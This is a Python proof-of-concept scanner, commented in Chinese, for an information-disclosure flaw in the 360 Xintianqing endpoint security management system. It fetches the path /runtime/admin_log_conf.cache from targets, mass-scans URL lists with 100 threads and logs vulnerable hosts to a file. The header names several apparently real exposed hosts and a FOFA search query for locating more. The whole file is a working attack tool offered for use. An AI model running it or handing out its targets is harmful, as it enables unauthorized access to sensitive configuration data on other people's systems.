# 360 新天擎终端安全管理系统信息泄露漏洞
# http://ip:port/runtime/admin_log_conf.cache
# http://218.2.231.183:9080
# http://gw.wzer.net:8080
# http://61.153.10.79:8080
# fofa:title="360新天擎"
import requests, sys, re, argparse, time
from multiprocessing.dummy import Pool  # 导入线程池模块
requests.packages.urllib3.disable_warnings()  # 禁用SSL警告

def banner():
    # 横幅
    test = """
 _____        ___                             _                _            _
(_____)      / __)                       _   (_)              | |          | |
   _   ____ | |__ ___   ____ ____   ____| |_  _  ___  ____ ___| | ____ ____| | _ ____  ____  ____
  | | |  _ \|  __) _ \ / ___)    \ / _  |  _)| |/ _ \|  _ (___) |/ _  ) _  | |/ ) _  |/ _  |/ _  )
 _| |_| | | | | | |_| | |   | | | ( ( | | |__| | |_| | | | |  | ( (/ ( ( | | |< ( ( | ( ( | ( (/ /
(_____)_| |_|_|  \___/|_|   |_|_|_|\_||_|\___)_|\___/|_| |_|  |_|\____)_||_|_| \_)_||_|\_|| |\____)
                                                                                       (_____|      
                                                                       author:dsw
                                                                       version:1.0.0
"""

    print(test)

def main():
    # 主函数，处理命令行参数并启动程序
    banner() 
    parser = argparse.ArgumentParser(description='360新天擎Information-leakage')  # 创建命令行参数解析器
    parser.add_argument('-u', '--url', dest='url', type=str, help='输入单个URL进行扫描')  # 接受单个URL作为参数
    parser.add_argument('-f', '--file', dest='file', type=str, help='从文件中读取URL列表进行扫描')  # 接受包含URL的文件作为参数
    args = parser.parse_args()  # 解析命令行参数

    if args.url and not args.file:
        poc(args.url)  # 如果提供了单个URL参数，则调用poc函数扫描该URL
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())  # 从文件中读取URL并去除空白字符
        mp = Pool(100)  # 使用100个线程的线程池进行并发扫描
        mp.map(poc, url_list)  # 映射poc函数到URL列表中的每个URL
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程执行完成
    else:
        print(f"使用方法:\n\t python3 {sys.argv[0]} -h")  # 如果参数无效，打印使用方法

def poc(target):
    # 执行实际的漏洞扫描功能
    url_payload = '/runtime/admin_log_conf.cache'  # 待检测的漏洞路径
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'}  # 设置User-Agent头部
    proxies = {
        'http': 'http://127.0.0.1:8080',  # 设置代理
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res = requests.get(url=target + url_payload, headers=headers, proxies=proxies, timeout=6)  # 发送GET请求
        if res.status_code == 200:
            print(f"[+] {target} 存在信息泄漏漏洞！")  # 如果存在漏洞，输出结果
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')  # 将有漏洞的URL写入结果文件
                return True
        else:
            print('[-] 不存在漏洞')  # 如果没有找到漏洞，输出结果
            return False
    except:
        print('目标网站存在问题，无法访问')  # 处理无法连接目标时的异常情况

if __name__ == '__main__':
    main()  # 程序入口点，调用main函数启动程序
